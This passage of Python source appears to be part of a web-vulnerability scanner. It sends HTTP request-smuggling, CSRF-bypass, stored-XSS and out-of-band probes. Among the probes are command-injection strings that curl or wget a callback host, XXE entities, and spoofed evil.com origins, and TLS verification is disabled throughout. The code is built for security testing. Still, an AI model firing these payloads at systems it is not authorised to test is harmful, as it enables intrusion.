        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_ssl = parsed.scheme == "https"
        path = parsed.path or "/"

        probes = PAYLOADS.get("http_smuggling", [])
        detectors = [(re.compile(pat, re.I), desc)
                     for pat, desc in DETECTORS.get("http_smuggling", [])]

        # Track which URLs already flagged to avoid dupes per technique
        seen_techniques: set[str] = set()

        for probe in probes:
            if self.stop_event.is_set():
                return

            name      = probe["name"]
            technique = probe["technique"]
            headers   = probe["headers"]
            body      = probe["body"]

            # Skip duplicate technique findings for same URL
            if technique in seen_techniques:
                continue

            try:
                finding = self._smuggling_raw_probe(
                    host, port, use_ssl, path, headers, body,
                    name, technique, url, detectors,
                )
                if finding:
                    self.results.append(finding)
                    seen_techniques.add(technique)
            except Exception:
                continue

            if self.rate_limit:
                time.sleep(self.rate_limit)

    def _smuggling_raw_probe(
        self, host: str, port: int, use_ssl: bool, path: str,
        headers: dict, body: str, name: str, technique: str,
        url: str, detectors: list,
    ) -> "FuzzResult | None":
        """Send a single smuggling probe via raw socket.

        Raw sockets are necessary because:
        - requests library deduplicates/normalizes Content-Length headers
        - requests library normalizes Transfer-Encoding values
        - We need to send duplicate headers (e.g., two Content-Length values)
        - We need to send malformed Transfer-Encoding (tabs, spaces, null bytes)
        """
        import socket
        import ssl

        # Build raw HTTP request
        request_lines = [f"POST {path} HTTP/1.1"]
        request_lines.append(f"Host: {host}")
        request_lines.append("Content-Type: application/x-www-form-urlencoded")
        request_lines.append("User-Agent: Mozilla/5.0 (DAST-Smuggling/2.0)")
        request_lines.append("Connection: keep-alive")

        # Add probe headers (may include duplicates with different casing)
        for hdr_name, hdr_val in headers.items():
            request_lines.append(f"{hdr_name}: {hdr_val}")

        raw_request = "\r\n".join(request_lines) + "\r\n\r\n" + body

        # Send via raw socket
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)

            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.sendall(raw_request.encode("utf-8", errors="replace"))

            # Read response
            t0 = time.time()
            response_data = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
                    # Don't read forever — 16KB is plenty for detection
                    if len(response_data) > 16384:
                        break
                except socket.timeout:
                    elapsed = time.time() - t0
                    # Timeout itself is a strong desync signal
                    if elapsed > self.timeout * 0.8:
                        return FuzzResult(
                            url=url, method="POST",
                            param="Transfer-Encoding", param_type="header",
                            payload=name, vuln_type="http_smuggling",
                            finding=f"HTTP smuggling — timeout on {technique} probe (possible desync)",
                            severity="high",
                            resp_time_ms=elapsed * 1000,
                            status_code=0,
                        )
                    break

            elapsed = time.time() - t0
            resp_text = response_data.decode("utf-8", errors="replace")

            # Parse status code from raw response
            status_code = 0
            status_match = re.match(r"HTTP/\d\.\d\s+(\d+)", resp_text)
            if status_match:
                status_code = int(status_match.group(1))

            # ── Detection 1: Status code anomaly ──
            if status_code in (400, 500, 501, 502, 504, 505):
                return FuzzResult(
                    url=url, method="POST",
                    param="Transfer-Encoding", param_type="header",
                    payload=name, vuln_type="http_smuggling",
                    finding=(f"HTTP smuggling — {technique} probe returned "
                             f"{status_code} (server confused by CL/TE conflict)"),
                    severity="high",
                    resp_time_ms=elapsed * 1000,
                    status_code=status_code,
                )

            # ── Detection 2: Response body error patterns ──
            for pat, desc in detectors:
                if pat.search(resp_text):
                    return FuzzResult(
                        url=url, method="POST",
                        param="Transfer-Encoding", param_type="header",
                        payload=name, vuln_type="http_smuggling",
                        finding=f"HTTP smuggling — {desc} [{technique}: {name}]",
                        severity="high",
                        resp_time_ms=elapsed * 1000,
                        status_code=status_code,
                    )

            # ── Detection 3: Connection unexpectedly closed very fast ──
            if not response_data and elapsed < 1.0:
                return FuzzResult(
                    url=url, method="POST",
                    param="Transfer-Encoding", param_type="header",
                    payload=name, vuln_type="http_smuggling",
                    finding=(f"HTTP smuggling — connection immediately closed "
                             f"on {technique} probe (desync rejection)"),
                    severity="medium",
                    resp_time_ms=elapsed * 1000,
                    status_code=0,
                )

            return None

        except (ConnectionResetError, BrokenPipeError):
            # Connection reset is a strong desync indicator
            return FuzzResult(
                url=url, method="POST",
                param="Transfer-Encoding", param_type="header",
                payload=name, vuln_type="http_smuggling",
                finding=f"HTTP smuggling — connection reset on {technique} probe",
                severity="high",
                resp_time_ms=0,
                status_code=0,
            )
        except socket.timeout:
            return FuzzResult(
                url=url, method="POST",
                param="Transfer-Encoding", param_type="header",
                payload=name, vuln_type="http_smuggling",
                finding=f"HTTP smuggling — timeout on {technique} probe (possible desync)",
                severity="high",
                resp_time_ms=self.timeout * 1000,
                status_code=0,
            )
        except Exception:
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    # ── CSRF Bypass Testing ──────────────────────────────────────────────────

    # Common CSRF token field name patterns
    _CSRF_FIELD_RE = re.compile(
        r'<input[^>]+name=["\']?([^"\'>\s]*(?:csrf|xsrf|token|authenticity[_-]token|'
        r'__RequestVerificationToken|antiforgery|_token|csrfmiddlewaretoken)[^"\'>\s]*)'
        r'["\']?[^>]+value=["\']?([^"\'>\s]*)["\']?',
        re.I,
    )

    _CSRF_META_RE = re.compile(
        r'<meta[^>]+(?:name|property)=["\']?(?:csrf-token|_csrf|_token|X-CSRF-TOKEN)'
        r'["\']?[^>]+content=["\']?([^"\'>\s]+)["\']?',
        re.I,
    )

    def _fuzz_csrf(self, surfaces: list):
        """
        Active CSRF bypass testing on form surfaces.

        Strategy:
        1. For each POST form surface, fetch the page to get the baseline form + token
        2. Submit the form normally (baseline — must succeed)
        3. For each bypass technique, re-submit with the bypass applied
        4. If the server accepts the request (not 403/400/token error), flag as CSRF bypass

        All probes use the SAME form data — only the token/headers are modified.
        This ensures no application state corruption beyond what the form normally does.
        """
        import uuid as _uuid

        # Deduplicate by form URL (don't test the same form action multiple times)
        seen_actions: set[str] = set()
        form_surfaces = [s for s in surfaces
                         if s.method == "POST" and s.param_type == "form"]

        for surface in form_surfaces:
            if self.stop_event.is_set():
                return
            if surface.url in seen_actions:
                continue
            seen_actions.add(surface.url)

            # Step 1: Fetch the page that contains the form to extract token
            try:
                page_resp = self.session.get(
                    surface.url, timeout=self.timeout, verify=False,
                )
                if page_resp.status_code != 200:
                    continue
            except Exception:
                continue

            page_body = page_resp.text

            # Extract CSRF token from form or meta tag
            token_field = None
            token_value = None

            m = self._CSRF_FIELD_RE.search(page_body)
            if m:
                token_field = m.group(1)
                token_value = m.group(2)
            else:
                # Try meta tag
                meta_m = self._CSRF_META_RE.search(page_body)
                if meta_m:
                    token_value = meta_m.group(1)
                    # Common header names for meta-based CSRF
                    token_field = "X-CSRF-TOKEN"

            # Build baseline form data from surface
            form_data = {}
            if surface.body_template:
                for pair in surface.body_template.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        form_data[k] = v

            # If token found, add it to baseline
            if token_field and token_value:
                form_data[token_field] = token_value

            # Step 2: Baseline — submit form normally (should succeed)
            try:
                baseline_resp = self.session.post(
                    surface.url, data=form_data, timeout=self.timeout,
                    verify=False, allow_redirects=True,
                )
                baseline_status = baseline_resp.status_code
                baseline_body = baseline_resp.text[:4096]
            except Exception:
                continue

            # If baseline itself fails with 403/400, skip — form may need auth
            if baseline_status in (401, 403):
                continue

            # Step 3: Run each bypass technique
            probes = PAYLOADS.get("csrf", [])
            for probe in probes:
                if self.stop_event.is_set():
                    return

                technique = probe["technique"]
                name = probe["name"]

                try:
                    result = self._csrf_probe(
                        surface, form_data, token_field, token_value,
                        technique, name, baseline_status, baseline_body,
                    )
                    if result:
                        self.results.append(result)
                        break  # one CSRF finding per form is enough
                except Exception:
                    continue

                if self.rate_limit:
                    time.sleep(self.rate_limit)

    def _csrf_probe(
        self, surface, form_data: dict, token_field: str | None,
        token_value: str | None, technique: str, name: str,
        baseline_status: int, baseline_body: str,
    ) -> "FuzzResult | None":
        """Execute a single CSRF bypass probe and check if server accepted it."""
        import uuid as _uuid

        test_data = dict(form_data)  # copy
        extra_headers = {}
        method = "POST"
        content_type = "application/x-www-form-urlencoded"

        # ── Apply bypass technique ──
        if technique == "token_remove":
            if token_field and token_field in test_data:
                del test_data[token_field]
            else:
                return None  # no token to remove

        elif technique == "token_empty":
            if token_field and token_field in test_data:
                test_data[token_field] = ""
            else:
                return None

        elif technique == "token_random":
            if token_field:
                test_data[token_field] = _uuid.uuid4().hex
            else:
                return None

        elif technique == "token_null":
            if token_field:
                test_data[token_field] = "null"
            else:
                return None

        elif technique == "token_static":
            if token_field:
                test_data[token_field] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
            else:
                return None

        elif technique == "token_short":
            if token_field and token_value:
                test_data[token_field] = token_value[:4]
            else:
                return None

        elif technique == "no_referer":
            extra_headers["Referer"] = ""

        elif technique == "wrong_referer":
            extra_headers["Referer"] = "https://evil.com/csrf-attack"

        elif technique == "null_origin":
            extra_headers["Origin"] = "null"

        elif technique == "wrong_origin":
            extra_headers["Origin"] = "https://evil.com"

        elif technique == "origin_subdomain":
            parsed = urlparse(surface.url)
            extra_headers["Origin"] = f"https://evil.{parsed.hostname}"

        elif technique == "method_get":
            # Convert POST to GET with params in query string
            method = "GET"

        elif technique == "method_override_header":
            extra_headers["X-HTTP-Method-Override"] = "GET"

        elif technique == "method_override_param":
            test_data["_method"] = "GET"

        elif technique == "content_type_plain":
            content_type = "text/plain"

        elif technique == "content_type_multipart":
            content_type = "multipart/form-data"

        elif technique == "combo_remove_null_origin":
            if token_field and token_field in test_data:
                del test_data[token_field]
            extra_headers["Origin"] = "null"

        elif technique == "combo_remove_no_referer_plain":
            if token_field and token_field in test_data:
                del test_data[token_field]
            extra_headers["Referer"] = ""
            content_type = "text/plain"

        # ── Send the probe ──
        try:
            headers = {"Content-Type": content_type}
            headers.update(extra_headers)

            if method == "GET":
                resp = self.session.get(
                    surface.url, params=test_data, headers=headers,
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
            elif content_type == "multipart/form-data":
                # Let requests handle multipart boundary
                resp = self.session.post(
                    surface.url, files={k: (None, v) for k, v in test_data.items()},
                    headers={k: v for k, v in headers.items() if k != "Content-Type"},
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
            else:
                resp = self.session.post(
                    surface.url, data=test_data, headers=headers,
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
        except Exception:
            return None

        resp_body = resp.text[:4096]

        # ── Detection: Did the server accept the request? ──
        # Check for rejection indicators first (protected)
        csrf_detectors = DETECTORS.get("csrf", [])
        for pat_str, desc in csrf_detectors:
            pat = re.compile(pat_str, re.I)
            if pat.search(resp_body):
                if "CSRF_PROTECTED" in desc:
                    # Server properly rejected — not vulnerable
                    return None

        # If server returned 403/400/422 — protected
        if resp.status_code in (400, 403, 419, 422):
            return None

        # Check if response looks like it succeeded
        # (similar status to baseline AND no rejection message)
        accepted = False

        # Same status as baseline
        if resp.status_code == baseline_status:
            accepted = True
        # Redirect (302/303) — often means form was processed
        elif resp.status_code in (200, 201, 302, 303):
            accepted = True

        if not accepted:
            return None

        # Additional confirmation: check for success patterns in body
        for pat_str, desc in csrf_detectors:
            pat = re.compile(pat_str, re.I)
            if pat.search(resp_body) and "CSRF_PROTECTED" not in desc:
                return FuzzResult(
                    url=surface.url, method=method,
                    param=token_field or "csrf_token",
                    param_type="form", payload=name,
                    vuln_type="csrf",
                    finding=(f"CSRF bypass — {name}: server accepted "
                             f"request ({resp.status_code}) — {desc}"),
                    severity="high",
                    resp_time_ms=0,
                    status_code=resp.status_code,
                )

        # Even without success pattern, if status matches baseline and
        # response body is substantially similar (not an error page),
        # it's likely vulnerable
        if (resp.status_code == baseline_status and
                len(resp_body) > 100 and
                abs(len(resp_body) - len(baseline_body)) / max(len(baseline_body), 1) < 0.5):
            return FuzzResult(
                url=surface.url, method=method,
                param=token_field or "csrf_token",
                param_type="form", payload=name,
                vuln_type="csrf",
                finding=(f"CSRF bypass — {name}: server returned same status "
                         f"({resp.status_code}) as baseline without valid token"),
                severity="high",
                resp_time_ms=0,
                status_code=resp.status_code,
            )

        return None

    def _fuzz_stored_xss(self, surface):
        """
        Stored XSS: inject payloads with unique canary tokens, then re-fetch
        the page to check if the payload persisted in the response body.

        Two-phase approach:
          1. INJECT: POST/PUT the payload with a unique canary
          2. VERIFY: GET the same URL (and redirect target) to look for the canary
        """
        import uuid

        templates = PAYLOADS.get("xss_stored", [])
        if not templates:
            return

        # Only run on writable surfaces (POST, PUT, PATCH)
        if surface.method in ("GET", "HEAD", "OPTIONS", "DELETE"):
            return

        # Collect canaries for batch verification
        injections: list[tuple[str, str, str]] = []  # (canary, payload, template)

        for template in templates[:8]:
            if self.stop_event.is_set():
                return

            canary  = f"DAST-SXSS-{uuid.uuid4().hex[:8]}"
            payload = template.replace("{CANARY}", canary)

            time.sleep(self.rate_limit)
            inject_resp = self._send_and_capture(surface, payload)

            if inject_resp is not None:
                injections.append((canary, payload, template))

                # Check if response itself reflects the canary (immediate reflection)
                try:
                    if canary in inject_resp.text:
                        # Check for redirect (302 → GET pattern)
                        loc = inject_resp.headers.get("location", "")
                        if loc and inject_resp.status_code in (301, 302, 303, 307, 308):
                            # Follow redirect and check
                            time.sleep(self.rate_limit)
                            try:
                                redir_resp = self.session.get(
                                    urljoin(surface.url, loc),
                                    timeout=self.timeout, verify=False,
                                    allow_redirects=False,
                                )
                                if canary in redir_resp.text:
                                    self._check_stored_canary(
                                        surface, canary, payload, template,
                                        redir_resp, urljoin(surface.url, loc),
                                    )
                            except Exception:
                                pass
                except Exception:
                    pass

        if not injections:
            return

        # ── Verification phase: re-fetch the form page to check persistence ──
        time.sleep(self.rate_limit * 3)  # brief delay for server-side persistence

        verify_urls = {surface.url}
        # Also check the page without query params (common for form submissions)
        parsed = urlparse(surface.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        verify_urls.add(base_url)

        for vurl in verify_urls:
            if self.stop_event.is_set():
                return
            try:
                time.sleep(self.rate_limit)
                verify_resp = self.session.get(
                    vurl, timeout=self.timeout, verify=False, allow_redirects=True,
                )
                body = verify_resp.text

                for canary, payload, template in injections:
                    if canary in body:
                        self._check_stored_canary(
                            surface, canary, payload, template, verify_resp, vurl,
                        )
                        return  # one confirmed stored XSS per surface is enough
            except Exception:
                pass

    def _check_stored_canary(self, surface, canary: str, payload: str,
                             template: str, resp, verify_url: str):
        """Evaluate whether a persisted canary constitutes confirmed stored XSS."""
        body = resp.text

        # Check if the canary appears in an unescaped XSS context
        confirmed = False
        for pat in self._STORED_XSS_CONFIRM_PATTERNS:
            concrete = re.compile(pat.pattern.replace("{CANARY}", re.escape(canary)), re.I)
            if concrete.search(body):
                confirmed = True
                break

        if confirmed:
            severity = "high"
            finding_text = (
                f"STORED XSS CONFIRMED — payload persisted unescaped "
                f"[canary={canary}, param={surface.param}, "
                f"verified_at={verify_url}]"
            )
        else:
            severity = "low"
            finding_text = (
                f"Stored XSS potential — canary persisted (may be escaped) "
                f"[canary={canary}, param={surface.param}, "
                f"verified_at={verify_url}]"
            )

        url = self._build_url(surface, payload)
        headers = self._build_headers(surface, payload)
        body_req = self._build_body(surface, payload)
        eid = self._store_evidence(surface, "xss_stored", payload, url,
                                   headers, body_req or "", resp, 0.0)
        self._record_finding(surface, "xss_stored", payload, finding_text,
                             severity, url, dict(resp.headers), str(headers),
                             body[:4096], 0.0, resp.status_code, eid)

    # ── OAST out-of-band injection & collection ────────────────────────────

    # Vuln types that benefit from OAST blind detection
    _OAST_VULN_TYPES = {
        "ssrf":  "critical",   # Blind SSRF — server fetches our callback
        "xxe":   "high",       # Blind XXE — XML parser fetches our entity
        "cmdi":  "critical",   # Blind CMDi — command executes callback
    }

    def _inject_oast_payloads(self, surface):
        """
        Inject OAST callback URLs as payloads for blind vulnerability detection.
        Generates unique tokens per injection so callbacks can be correlated.
        """
        param_vulns = self.PARAM_TYPE_MAP.get(surface.param_type, [])

        for vuln_type, sev in self._OAST_VULN_TYPES.items():
            if vuln_type not in param_vulns:
                continue
            if self.stop_event.is_set():
                return

            oast_url = self.oast.make_url(vuln_type, surface.url, surface.param)
            # Extract token from URL path
            token = oast_url.rstrip("/").split("/")[-1]

            # Build vuln-specific payloads using the OAST callback URL
            oast_payloads: list[str] = []

            if vuln_type == "ssrf":
                oast_payloads = [
                    oast_url,
                    oast_url + "/ssrf-probe",
                ]

            elif vuln_type == "xxe":
                oast_payloads = [
                    (
                        f'<?xml version="1.0"?><!DOCTYPE foo ['
                        f'<!ENTITY xxe SYSTEM "{oast_url}/xxe-probe">'
                        f']><x>&xxe;</x>'
                    ),
                    (
                        f'<?xml version="1.0"?><!DOCTYPE foo ['
                        f'<!ENTITY % xxe SYSTEM "{oast_url}/xxe-param">'
                        f'%xxe;]><x>test</x>'
                    ),
                ]

            elif vuln_type == "cmdi":
                oast_payloads = [
                    f"; curl {oast_url}/cmdi-curl ;",
                    f"| curl {oast_url}/cmdi-pipe",
                    f"& curl {oast_url}/cmdi-bg &",
                    f"`curl {oast_url}/cmdi-backtick`",
                    f"$(curl {oast_url}/cmdi-sub)",
                    f"; wget -q {oast_url}/cmdi-wget ;",
                    f"| wget -q -O- {oast_url}/cmdi-wget-pipe",
                ]

            # Track token → metadata for callback correlation
            with self._lock:
                self._oast_tokens[token] = {
                    "vuln_type": vuln_type,
                    "surface":   surface,
                    "severity":  sev,
                    "payloads":  [p[:80] for p in oast_payloads],
                }

            # Inject each OAST payload
            for payload in oast_payloads:
                if self.stop_event.is_set():
                    return
                time.sleep(self.rate_limit)
                self._send_and_capture(surface, payload)

    def _collect_oast_findings(self, wait: float = 5.0):
        """
        After all in-band fuzzing completes, wait briefly and check
        for any OAST callbacks that indicate blind vulnerabilities.
        """
        time.sleep(wait)  # give target servers time to make callbacks

        callbacks = self.oast.get_callbacks()
        if not callbacks:
            return

        seen_tokens = set()
        for cb in callbacks:
            if cb.token in seen_tokens:
                continue
            seen_tokens.add(cb.token)

            with self._lock:
                meta = self._oast_tokens.get(cb.token)
            if not meta:
                continue

            vuln_type = meta["vuln_type"]
            surface   = meta["surface"]
            severity  = meta["severity"]

            vuln_labels = {
                "ssrf": "Blind SSRF CONFIRMED",
                "xxe":  "Blind XXE CONFIRMED",
                "cmdi": "Blind Command Injection CONFIRMED",
            }
            label = vuln_labels.get(vuln_type, "Blind vulnerability CONFIRMED")

            finding_text = (
                f"{label} — OAST callback received "
                f"[{cb.method} from {cb.source_ip}, "
                f"param={surface.param}, "
                f"target={surface.url}]"
            )

            result = FuzzResult(
                url=surface.url,
                method=surface.method,
                param=surface.param,
                param_type=surface.param_type,
                payload=f"OAST:{cb.token}",
                vuln_type=f"{vuln_type}_blind",
                finding=finding_text,
                severity=severity,
                evidence_id=None,
                resp_time_ms=0.0,
                status_code=0,
            )
            with self._lock:
                self.results.append(result)
            if self.on_finding:
                self.on_finding(result)

    def _send_and_capture(self, surface, payload: str):
        """Send a payload and return the response object, or None on failure."""
        url     = self._build_url(surface, payload)
        body    = self._build_body(surface, payload)
        headers = self._build_headers(surface, payload)

        if not self.scope.in_scope(url):
            return None

        try:
            return self.session.request(
                surface.method,
                url,
                data=body if surface.method not in ("GET", "HEAD") else None,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
        except Exception:
            return None

    def _baseline(self, surface) -> float:
        """Measure baseline response time for time-based detection."""
        try:
            t0   = time.time()
            self.session.request(
                surface.method,
                self._build_url(surface, "BASELINE_VALUE"),
                data=self._build_body(surface, "BASELINE_VALUE") if surface.method != "GET" else None,
                timeout=self.timeout, verify=False, allow_redirects=False,
            )
            return time.time() - t0
        except Exception:
            return 1.0

    def _send_payload(self, surface, vuln_type: str, payload: str, baseline: Optional[float]):
        url     = self._build_url(surface, payload)
        body    = self._build_body(surface, payload)
        headers = self._build_headers(surface, payload)

        if not self.scope.in_scope(url):
            return

        try:
            t0   = time.time()
            resp = self.session.request(
                surface.method,
                url,
                data=body if surface.method not in ("GET", "HEAD") else None,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
            elapsed = (time.time() - t0) * 1000

        except requests.exceptions.Timeout:
            elapsed = self.timeout * 1000
            # Timeout on time-based payload = positive signal
            if vuln_type == "sqli_blind_time" and baseline is not None:
                finding_text = f"Time-based blind SQLi — response timed out on SLEEP payload [{surface.param}={payload}]"
                self._record_finding(surface, vuln_type, payload, finding_text, "high",
                                     url, {}, str(headers), "", elapsed, 408)
            return
        except Exception:
            return

        resp_text = ""
        try:
            resp_text = resp.text
        except Exception:
            pass

        # ── Time-based blind detection ────────────────────────────────────
        if vuln_type == "sqli_blind_time" and baseline is not None:
            delta = (elapsed / 1000) - baseline
            if delta >= self.time_threshold:
                finding_text = (
                    f"Time-based blind SQLi CONFIRMED — response delayed {delta:.1f}s "
                    f"on SLEEP payload [{surface.param}={payload}]"
                )
                eid = self._store_evidence(surface, vuln_type, payload, url,
                                           headers, body or "", resp, elapsed)
                self._record_finding(surface, vuln_type, payload, finding_text, "high",
                                     url, dict(resp.headers), str(headers), resp_text,
                                     elapsed, resp.status_code, eid)
            return

        # ── Open redirect — check Location header, then body patterns ─────
        if vuln_type == "open_redirect":
            # 1) Location header check (3xx redirect)
            location = resp.headers.get("location", "") or resp.headers.get("Location", "")
            if location and "evil.com" in location.lower():
                finding_text = f"Open Redirect CONFIRMED — Location: {location} [{surface.param}={payload}]"
                eid = self._store_evidence(surface, vuln_type, payload, url,
                                           headers, body or "", resp, elapsed)
                self._record_finding(surface, vuln_type, payload, finding_text, "medium",
                                     url, dict(resp.headers), str(headers), resp_text,
                                     elapsed, resp.status_code, eid)
                return
            # 2) Body-based detection (meta refresh, JS redirect, URI reflection)
            for pattern, desc in DETECTORS.get("open_redirect", []):
                if re.search(pattern, resp_text, re.I | re.S):
                    finding_text = f"{desc} [{surface.url} | param={surface.param} | payload={payload[:60]}]"
                    eid = self._store_evidence(surface, vuln_type, payload, url,
                                               headers, body or "", resp, elapsed)
                    self._record_finding(surface, vuln_type, payload, finding_text, "medium",
                                         url, dict(resp.headers), str(headers), resp_text,
                                         elapsed, resp.status_code, eid)
                    return
            return

        # ── Pattern-based detection ───────────────────────────────────────
        for pattern, desc in DETECTORS.get(vuln_type, []):
            if re.search(pattern, resp_text, re.I | re.S):
                finding_text = f"{desc} [{surface.url} | param={surface.param} | payload={payload[:60]}]"
                eid = self._store_evidence(surface, vuln_type, payload, url,
                                           headers, body or "", resp, elapsed)
                self._record_finding(surface, vuln_type, payload, finding_text,
                                     self.SEV_MAP.get(vuln_type, "medium"),
                                     url, dict(resp.headers), str(headers), resp_text,
                                     elapsed, resp.status_code, eid)
                return   # one finding per payload is enough

    # ── Request builders ──────────────────────────────────────────────────────

    def _build_url(self, surface, payload: str) -> str:
        if surface.param_type == "query":
            from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
            p = urlparse(surface.url)
            params = parse_qs(p.query)
            params[surface.param] = [payload]
            new_query = urlencode({k: v[0] for k, v in params.items()})
            return urlunparse(p._replace(query=new_query))
        return surface.url

    def _build_body(self, surface, payload: str) -> Optional[str]:
        if surface.param_type == "form" and surface.method not in ("GET", "HEAD"):
            from urllib.parse import parse_qs, urlencode
            base = {k: v[0] for k, v in parse_qs(surface.body_template).items()}
            base[surface.param] = payload
            return urlencode(base)
        if surface.param_type == "json" and surface.method not in ("GET", "HEAD"):
            import json
            return json.dumps({surface.param: payload})
        return None

    def _build_headers(self, surface, payload: str) -> dict:
        h = {"User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)"}
        if surface.param_type == "header":
            h[surface.param] = payload
        if surface.content_type:
            h["Content-Type"] = surface.content_type
        return h

    # ── Result recording ──────────────────────────────────────────────────────

    def _store_evidence(self, surface, vuln_type: str, payload: str, url: str,
                        req_headers: dict, req_body: str,
                        resp: requests.Response, elapsed: float) -> str:
        return self.ev_store.record(
            url=url,
            method=surface.method,
            req_headers=req_headers,
            req_body=req_body,
            status_code=resp.status_code,
            resp_headers=dict(resp.headers),
            resp_body=resp.text[:4096],
            resp_time_ms=elapsed,
            vuln_type=vuln_type,
            payload=payload,
            parameter=surface.param,
        )

    def _record_finding(self, surface, vuln_type: str, payload: str,
                        finding_text: str, severity: str,
                        url: str, resp_headers: dict, req_headers: str,
                        resp_text: str, elapsed: float, status: int,
                        eid: Optional[str] = None):
        result = FuzzResult(
            url=surface.url, method=surface.method,
            param=surface.param, param_type=surface.param_type,
            payload=payload, vuln_type=vuln_type,
            finding=finding_text, severity=severity,
            evidence_id=eid, resp_time_ms=elapsed, status_code=status,
        )
        with self._lock:
            self.results.append(result)
        if self.on_finding:
            self.on_finding(result)
